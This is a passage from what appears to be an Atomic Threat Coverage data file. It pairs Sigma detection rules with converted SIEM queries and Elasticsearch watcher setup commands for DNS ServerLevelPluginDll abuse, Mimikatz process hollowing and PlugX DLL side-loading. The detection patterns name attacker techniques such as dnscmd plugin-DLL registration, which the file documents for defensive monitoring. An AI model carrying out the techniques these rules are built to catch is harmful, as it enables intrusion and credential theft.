{{_source.TargetObject}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:*\\\\\\\\services\\\\\\\\DNS\\\\\\\\Parameters\\\\\\\\ServerLevelPluginDll)\\nCommandLine.keyword:dnscmd.exe \\\\/config \\\\/serverlevelplugindll *", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" TargetObject=\"*\\\\\\\\services\\\\\\\\DNS\\\\\\\\Parameters\\\\\\\\ServerLevelPluginDll\") | table EventID,CommandLine,ParentCommandLine,Image,User,TargetObject\\nCommandLine=\"dnscmd.exe /config /serverlevelplugindll *\" | table EventID,CommandLine,ParentCommandLine,Image,User,TargetObject", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" TargetObject=\"*\\\\\\\\services\\\\\\\\DNS\\\\\\\\Parameters\\\\\\\\ServerLevelPluginDll\")\\n(event_id=\"1\" CommandLine=\"dnscmd.exe /config /serverlevelplugindll *\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*.*\\\\services\\\\DNS\\\\Parameters\\\\ServerLevelPluginDll))'\\ngrep -P '^dnscmd\\\\.exe /config /serverlevelplugindll .*'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Possible Process Hollowing Image Loading\nid: e32ce4f5-46c6-4c47-ba69-5de3c9193cd7\nstatus: experimental\ndescription: Detects Loading of samlib.dll, WinSCard.dll from untypical process e.g. through process hollowing by Mimikatz\nreferences:\n    - https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for.html\nauthor: Markus Neis\ndate: 2018/01/07\ntags:\n    - attack.defense_evasion\n    - attack.t1073\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 7\n        Image:\n            - '*\\notepad.exe'\n        ImageLoaded:\n            - '*\\samlib.dll'\n            - '*\\WinSCard.dll'\n    condition: selection\nfalsepositives:\n    - Very likely, needs more tuning\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Possible Process Hollowing Image Loading\nid: e32ce4f5-46c6-4c47-ba69-5de3c9193cd7\nstatus: experimental\ndescription: Detects Loading of samlib.dll, WinSCard.dll from untypical process e.g. through process hollowing by Mimikatz\nreferences:\n    - https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for.html\nauthor: Markus Neis\ndate: 2018/01/07\ntags:\n    - attack.defense_evasion\n    - attack.t1073\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection:\n        EventID: 7\n        Image:\n            - '*\\notepad.exe'\n        ImageLoaded:\n            - '*\\samlib.dll'\n            - '*\\WinSCard.dll'\n    condition: selection\nfalsepositives:\n    - Very likely, needs more tuning\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"7\" AND Image.keyword:(*\\\\\\\\notepad.exe) AND ImageLoaded.keyword:(*\\\\\\\\samlib.dll OR *\\\\\\\\WinSCard.dll))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Possible-Process-Hollowing-Image-Loading <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Possible Process Hollowing Image Loading\",\\n    \"description\": \"Detects Loading of samlib.dll, WinSCard.dll from untypical process e.g. through process hollowing by Mimikatz\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1073\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"7\\\\\" AND Image.keyword:(*\\\\\\\\\\\\\\\\notepad.exe) AND ImageLoaded.keyword:(*\\\\\\\\\\\\\\\\samlib.dll OR *\\\\\\\\\\\\\\\\WinSCard.dll))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"7\\\\\" AND Image.keyword:(*\\\\\\\\\\\\\\\\notepad.exe) AND ImageLoaded.keyword:(*\\\\\\\\\\\\\\\\samlib.dll OR *\\\\\\\\\\\\\\\\WinSCard.dll))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Possible Process Hollowing Image Loading\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"7\" AND Image.keyword:(*\\\\\\\\notepad.exe) AND ImageLoaded.keyword:(*\\\\\\\\samlib.dll *\\\\\\\\WinSCard.dll))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"7\" (Image=\"*\\\\\\\\notepad.exe\") (ImageLoaded=\"*\\\\\\\\samlib.dll\" OR ImageLoaded=\"*\\\\\\\\WinSCard.dll\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"7\" Image IN [\"*\\\\\\\\notepad.exe\"] ImageLoaded IN [\"*\\\\\\\\samlib.dll\", \"*\\\\\\\\WinSCard.dll\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*7)(?=.*(?:.*.*\\\\notepad\\\\.exe))(?=.*(?:.*.*\\\\samlib\\\\.dll|.*.*\\\\WinSCard\\\\.dll)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Executable used by PlugX in Uncommon Location - Sysmon Version\nid: aeab5ec5-be14-471a-80e8-e344418305c2\nstatus: experimental\ndescription: Detects the execution of an executable that is typically used by PlugX for DLL side loading started from an uncommon location\nreferences:\n    - http://www.hexacorn.com/blog/2016/03/10/beyond-good-ol-run-key-part-36/\n    - https://countuponsecurity.com/2017/06/07/threat-hunting-in-the-enterprise-with-appcompatprocessor/\nauthor: Florian Roth\ndate: 2017/06/12\ntags:\n    - attack.s0013\n    - attack.defense_evasion\n    - attack.t1073\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cammute:\n        Image: '*\\CamMute.exe'\n    filter_cammute:\n        Image: '*\\Lenovo\\Communication Utility\\\\*'\n    selection_chrome_frame:\n        Image: '*\\chrome_frame_helper.exe'\n    filter_chrome_frame:\n        Image: '*\\Google\\Chrome\\application\\\\*'\n    selection_devemu:\n        Image: '*\\dvcemumanager.exe'\n    filter_devemu:\n        Image: '*\\Microsoft Device Emulator\\\\*'\n    selection_gadget:\n        Image: '*\\Gadget.exe'\n    filter_gadget:\n        Image: '*\\Windows Media Player\\\\*'\n    selection_hcc:\n        Image: '*\\hcc.exe'\n    filter_hcc:\n        Image: '*\\HTML Help Workshop\\\\*'\n    selection_hkcmd:\n        Image: '*\\hkcmd.exe'\n    filter_hkcmd:\n        Image:\n            - '*\\System32\\\\*'\n            - '*\\SysNative\\\\*'\n            - '*\\SysWowo64\\\\*'\n    selection_mc:\n        Image: '*\\Mc.exe'\n    filter_mc:\n        Image:\n            - '*\\Microsoft Visual Studio*'\n            - '*\\Microsoft SDK*'\n            - '*\\Windows Kit*'\n    selection_msmpeng:\n        Image: '*\\MsMpEng.exe'\n    filter_msmpeng:\n        Image:\n            - '*\\Microsoft Security Client\\\\*'\n            - '*\\Windows Defender\\\\*'\n            - '*\\AntiMalware\\\\*'\n    selection_msseces:\n        Image: '*\\msseces.exe'\n    filter_msseces:\n        Image: \n            - '*\\Microsoft Security Center\\\\*'\n            - '*\\Microsoft Security Client\\\\*'\n            - '*\\Microsoft Security Essentials\\\\*'\n    selection_oinfo:\n        Image: '*\\OInfoP11.exe'\n    filter_oinfo:\n        Image: '*\\Common Files\\Microsoft Shared\\\\*'\n    selection_oleview:\n        Image: '*\\OleView.exe'\n    filter_oleview:\n        Image:\n            - '*\\Microsoft Visual Studio*'\n            - '*\\Microsoft SDK*'\n            - '*\\Windows Kit*'\n            - '*\\Windows Resource Kit\\\\*'\n    selection_rc:\n        Image: '*\\rc.exe'\n    filter_rc:\n        Image:\n            - '*\\Microsoft Visual Studio*'\n            - '*\\Microsoft SDK*'\n            - '*\\Windows Kit*'\n            - '*\\Windows Resource Kit\\\\*'\n            - '*\\Microsoft.NET\\\\*'\n    condition: ( selection_cammute and not filter_cammute ) or ( selection_chrome_frame and not filter_chrome_frame ) or ( selection_devemu and not filter_devemu )\n        or ( selection_gadget and not filter_gadget ) or ( selection_hcc and not filter_hcc ) or ( selection_hkcmd and not filter_hkcmd ) or ( selection_mc and not filter_mc\n        ) or ( selection_msmpeng and not filter_msmpeng ) or ( selection_msseces and not filter_msseces ) or ( selection_oinfo and not filter_oinfo ) or ( selection_oleview\n        and not filter_oleview ) or ( selection_rc and not filter_rc )\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Executable used by PlugX in Uncommon Location - Sysmon Version\nid: aeab5ec5-be14-471a-80e8-e344418305c2\nstatus: experimental\ndescription: Detects the execution of an executable that is typically used by PlugX for DLL side loading started from an uncommon location\nreferences:\n    - http://www.hexacorn.com/blog/2016/03/10/beyond-good-ol-run-key-part-36/\n    - https://countuponsecurity.com/2017/06/07/threat-hunting-in-the-enterprise-with-appcompatprocessor/\nauthor: Florian Roth\ndate: 2017/06/12\ntags:\n    - attack.s0013\n    - attack.defense_evasion\n    - attack.t1073\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cammute:\n        Image: '*\\CamMute.exe'\n    filter_cammute:\n        Image: '*\\Lenovo\\Communication Utility\\\\*'\n    selection_chrome_frame:\n        Image: '*\\chrome_frame_helper.exe'\n    filter_chrome_frame:\n        Image: '*\\Google\\Chrome\\application\\\\*'\n    selection_devemu:\n        Image: '*\\dvcemumanager.exe'\n    filter_devemu:\n        Image: '*\\Microsoft Device Emulator\\\\*'\n    selection_gadget:\n        Image: '*\\Gadget.exe'\n    filter_gadget:\n        Image: '*\\Windows Media Player\\\\*'\n    selection_hcc:\n        Image: '*\\hcc.exe'\n    filter_hcc:\n        Image: '*\\HTML Help Workshop\\\\*'\n    selection_hkcmd:\n        Image: '*\\hkcmd.exe'\n    filter_hkcmd:\n        Image:\n            - '*\\System32\\\\*'\n            - '*\\SysNative\\\\*'\n            - '*\\SysWowo64\\\\*'\n    selection_mc:\n        Image: '*\\Mc.exe'\n    filter_mc:\n        Image:\n            - '*\\Microsoft Visual Studio*'\n            - '*\\Microsoft SDK*'\n            - '*\\Windows Kit*'\n    selection_msmpeng:\n        Image: '*\\MsMpEng.exe'\n    filter_msmpeng:\n        Image:\n            - '*\\Microsoft Security Client\\\\*'\n            - '*\\Windows Defender\\\\*'\n            - '*\\AntiMalware\\\\*'\n    selection_msseces:\n        Image: '*\\msseces.exe'\n    filter_msseces:\n        Image: \n            - '*\\Microsoft Security Center\\\\*'\n            - '*\\Microsoft Security Client\\\\*'\n            - '*\\Microsoft Security Essentials\\\\*'\n    selection_oinfo:\n        Image: '*\\OInfoP11.exe'\n    filter_oinfo:\n        Image: '*\\Common Files\\Microsoft Shared\\\\*'\n    selection_oleview:\n        Image: '*\\OleView.exe'\n    filter_oleview:\n        Image:\n            - '*\\Microsoft Visual Studio*'\n            - '*\\Microsoft SDK*'\n            - '*\\Windows Kit*'\n            - '*\\Windows Resource Kit\\\\*'\n    selection_rc:\n        Image: '*\\rc.exe'\n    filter_rc:\n        Image:\n            - '*\\Microsoft Visual Studio*'\n            - '*\\Microsoft SDK*'\n            - '*\\Windows Kit*'\n            - '*\\Windows Resource Kit\\\\*'\n            - '*\\Microsoft.NET\\\\*'\n    condition: ( selection_cammute and not filter_cammute ) or ( selection_chrome_frame and not filter_chrome_frame ) or ( selection_devemu and not filter_devemu )\n        or ( selection_gadget and not filter_gadget ) or ( selection_hcc and not filter_hcc ) or ( selection_hkcmd and not filter_hkcmd ) or ( selection_mc and not filter_mc\n        ) or ( selection_msmpeng and not filter_msmpeng ) or ( selection_msseces and not filter_msseces ) or ( selection_oinfo and not filter_oinfo ) or ( selection_oleview\n        and not filter_oleview ) or ( selection_rc and not filter_rc )\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((((((((((((Image.keyword:*\\\\\\\\CamMute.exe AND (NOT (Image.keyword:*\\\\\\\\Lenovo\\\\\\\\Communication\\\\ Utility\\\\\\\\*))) OR (Image.keyword:*\\\\\\\\chrome_frame_helper.exe AND (NOT (Image.keyword:*\\\\\\\\Google\\\\\\\\Chrome\\\\\\\\application\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\dvcemumanager.exe AND (NOT (Image.keyword:*\\\\\\\\Microsoft\\\\ Device\\\\ Emulator\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\Gadget.exe AND (NOT (Image.keyword:*\\\\\\\\Windows\\\\ Media\\\\ Player\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\hcc.exe AND (NOT (Image.keyword:*\\\\\\\\HTML\\\\ Help\\\\ Workshop\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\hkcmd.exe AND (NOT (Image.keyword:(*\\\\\\\\System32\\\\\\\\* OR *\\\\\\\\SysNative\\\\\\\\* OR *\\\\\\\\SysWowo64\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\Mc.exe AND (NOT (Image.keyword:(*\\\\\\\\Microsoft\\\\ Visual\\\\ Studio* OR *\\\\\\\\Microsoft\\\\ SDK* OR *\\\\\\\\Windows\\\\ Kit*))))) OR (Image.keyword:*\\\\\\\\MsMpEng.exe AND (NOT (Image.keyword:(*\\\\\\\\Microsoft\\\\ Security\\\\ Client\\\\\\\\* OR *\\\\\\\\Windows\\\\ Defender\\\\\\\\* OR *\\\\\\\\AntiMalware\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\msseces.exe AND (NOT (Image.keyword:(*\\\\\\\\Microsoft\\\\ Security\\\\ Center\\\\\\\\* OR *\\\\\\\\Microsoft\\\\ Security\\\\ Client\\\\\\\\* OR *\\\\\\\\Microsoft\\\\ Security\\\\ Essentials\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\OInfoP11.exe AND (NOT (Image.keyword:*\\\\\\\\Common\\\\ Files\\\\\\\\Microsoft\\\\ Shared\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\OleView.exe AND (NOT (Image.keyword:(*\\\\\\\\Microsoft\\\\ Visual\\\\ Studio* OR *\\\\\\\\Microsoft\\\\ SDK* OR *\\\\\\\\Windows\\\\ Kit* OR *\\\\\\\\Windows\\\\ Resource\\\\ Kit\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\rc.exe AND (NOT (Image.keyword:(*\\\\\\\\Microsoft\\\\ Visual\\\\ Studio* OR *\\\\\\\\Microsoft\\\\ SDK* OR *\\\\\\\\Windows\\\\ Kit* OR *\\\\\\\\Windows\\\\ Resource\\\\ Kit\\\\\\\\* OR *\\\\\\\\Microsoft.NET\\\\\\\\*)))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Executable-used-by-PlugX-in-Uncommon-Location---Sysmon-Version <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Executable used by PlugX in Uncommon Location - Sysmon Version\",\\n    \"description\": \"Detects the execution of an executable that is typically used by PlugX for DLL side loading started from an uncommon location\",\\n    \"tags\": [\\n      \"attack.s0013\",\\n      \"attack.defense_evasion\",\\n      \"attack.t1073\"\\n    ],\\n    \"query\": \"((((((((((((Image.keyword:*\\\\\\\\\\\\\\\\CamMute.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\Lenovo\\\\\\\\\\\\\\\\Communication\\\\\\\\ Utility\\\\\\\\\\\\\\\\*))) OR (Image.keyword:*\\\\\\\\\\\\\\\\chrome_frame_helper.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\Google\\\\\\\\\\\\\\\\Chrome\\\\\\\\\\\\\\\\application\\\\\\\\\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\\\\\\\\\dvcemumanager.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Device\\\\\\\\ Emulator\\\\\\\\\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\\\\\\\\\Gadget.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\Windows\\\\\\\\ Media\\\\\\\\ Player\\\\\\\\\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\\\\\\\\\hcc.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\HTML\\\\\\\\ Help\\\\\\\\ Workshop\\\\\\\\\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\\\\\\\\\hkcmd.exe AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\SysNative\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\SysWowo64\\\\\\\\\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\\\\\\\\\Mc.exe AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Visual\\\\\\\\ Studio* OR *\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ SDK* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\ Kit*))))) OR (Image.keyword:*\\\\\\\\\\\\\\\\MsMpEng.exe AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Security\\\\\\\\ Client\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\ Defender\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\AntiMalware\\\\\\\\\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\\\\\\\\\msseces.exe AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Security\\\\\\\\ Center\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Security\\\\\\\\ Client\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Security\\\\\\\\ Essentials\\\\\\\\\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\\\\\\\\\OInfoP11.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\Common\\\\\\\\ Files\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Shared\\\\\\\\\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\\\\\\\\\OleView.exe AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Visual\\\\\\\\ Studio* OR *\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ SDK* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\ Kit* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\ Resource\\\\\\\\ Kit\\\\\\\\\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\\\\\\\\\rc.exe AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Visual\\\\\\\\ Studio* OR *\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ SDK* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\ Kit* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\ Resource\\\\\\\\ Kit\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Microsoft.NET\\\\\\\\\\\\\\\\*)))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((((((((((((Image.keyword:*\\\\\\\\\\\\\\\\CamMute.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\Lenovo\\\\\\\\\\\\\\\\Communication\\\\\\\\ Utility\\\\\\\\\\\\\\\\*))) OR (Image.keyword:*\\\\\\\\\\\\\\\\chrome_frame_helper.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\Google\\\\\\\\\\\\\\\\Chrome\\\\\\\\\\\\\\\\application\\\\\\\\\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\\\\\\\\\dvcemumanager.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Device\\\\\\\\ Emulator\\\\\\\\\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\\\\\\\\\Gadget.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\Windows\\\\\\\\ Media\\\\\\\\ Player\\\\\\\\\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\\\\\\\\\hcc.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\HTML\\\\\\\\ Help\\\\\\\\ Workshop\\\\\\\\\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\\\\\\\\\hkcmd.exe AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\System32\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\SysNative\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\SysWowo64\\\\\\\\\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\\\\\\\\\Mc.exe AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Visual\\\\\\\\ Studio* OR *\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ SDK* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\ Kit*))))) OR (Image.keyword:*\\\\\\\\\\\\\\\\MsMpEng.exe AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Security\\\\\\\\ Client\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\ Defender\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\AntiMalware\\\\\\\\\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\\\\\\\\\msseces.exe AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Security\\\\\\\\ Center\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Security\\\\\\\\ Client\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Security\\\\\\\\ Essentials\\\\\\\\\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\\\\\\\\\OInfoP11.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\Common\\\\\\\\ Files\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Shared\\\\\\\\\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\\\\\\\\\OleView.exe AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Visual\\\\\\\\ Studio* OR *\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ SDK* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\ Kit* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\ Resource\\\\\\\\ Kit\\\\\\\\\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\\\\\\\\\rc.exe AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ Visual\\\\\\\\ Studio* OR *\\\\\\\\\\\\\\\\Microsoft\\\\\\\\ SDK* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\ Kit* OR *\\\\\\\\\\\\\\\\Windows\\\\\\\\ Resource\\\\\\\\ Kit\\\\\\\\\\\\\\\\* OR *\\\\\\\\\\\\\\\\Microsoft.NET\\\\\\\\\\\\\\\\*)))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Executable used by PlugX in Uncommon Location - Sysmon Version\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}Hit on {{_source.@timestamp}}:\\\\n      CommandLine = {{_source.CommandLine}}\\\\nParentCommandLine = {{_source.ParentCommandLine}}================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((((((((((((Image.keyword:*\\\\\\\\CamMute.exe AND (NOT (Image.keyword:*\\\\\\\\Lenovo\\\\\\\\Communication Utility\\\\\\\\*))) OR (Image.keyword:*\\\\\\\\chrome_frame_helper.exe AND (NOT (Image.keyword:*\\\\\\\\Google\\\\\\\\Chrome\\\\\\\\application\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\dvcemumanager.exe AND (NOT (Image.keyword:*\\\\\\\\Microsoft Device Emulator\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\Gadget.exe AND (NOT (Image.keyword:*\\\\\\\\Windows Media Player\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\hcc.exe AND (NOT (Image.keyword:*\\\\\\\\HTML Help Workshop\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\hkcmd.exe AND (NOT (Image.keyword:(*\\\\\\\\System32\\\\\\\\* *\\\\\\\\SysNative\\\\\\\\* *\\\\\\\\SysWowo64\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\Mc.exe AND (NOT (Image.keyword:(*\\\\\\\\Microsoft Visual Studio* *\\\\\\\\Microsoft SDK* *\\\\\\\\Windows Kit*))))) OR (Image.keyword:*\\\\\\\\MsMpEng.exe AND (NOT (Image.keyword:(*\\\\\\\\Microsoft Security Client\\\\\\\\* *\\\\\\\\Windows Defender\\\\\\\\* *\\\\\\\\AntiMalware\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\msseces.exe AND (NOT (Image.keyword:(*\\\\\\\\Microsoft Security Center\\\\\\\\* *\\\\\\\\Microsoft Security Client\\\\\\\\* *\\\\\\\\Microsoft Security Essentials\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\OInfoP11.exe AND (NOT (Image.keyword:*\\\\\\\\Common Files\\\\\\\\Microsoft Shared\\\\\\\\*)))) OR (Image.keyword:*\\\\\\\\OleView.exe AND (NOT (Image.keyword:(*\\\\\\\\Microsoft Visual Studio* *\\\\\\\\Microsoft SDK* *\\\\\\\\Windows Kit* *\\\\\\\\Windows Resource Kit\\\\\\\\*))))) OR (Image.keyword:*\\\\\\\\rc.exe AND (NOT (Image.keyword:(*\\\\\\\\Microsoft Visual Studio* *\\\\\\\\Microsoft SDK* *\\\\\\\\Windows Kit* *\\\\\\\\Windows Resource Kit\\\\\\\\* *\\\\\\\\Microsoft.NET\\\\\\\\*)))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((((((((((((Image=\"*\\\\\\\\CamMute.exe\" NOT (Image=\"*\\\\\\\\Lenovo\\\\\\\\Communication Utility\\\\\\\\*\")) OR (Image=\"*\\\\\\\\chrome_frame_helper.exe\" NOT (Image=\"*\\\\\\\\Google\\\\\\\\Chrome\\\\\\\\application\\\\\\\\*\"))) OR (Image=\"*\\\\\\\\dvcemumanager.exe\" NOT (Image=\"*\\\\\\\\Microsoft Device Emulator\\\\\\\\*\"))) OR (Image=\"*\\\\\\\\Gadget.exe\" NOT (Image=\"*\\\\\\\\Windows Media Player\\\\\\\\*\"))) OR (Image=\"*\\\\\\\\hcc.exe\" NOT (Image=\"*\\\\\\\\HTML Help Workshop\\\\\\\\*\"))) OR (Image=\"*\\\\\\\\hkcmd.exe\" NOT ((Image=\"*\\\\\\\\System32\\\\\\\\*\" OR Image=\"*\\\\\\\\SysNative\\\\\\\\*\" OR 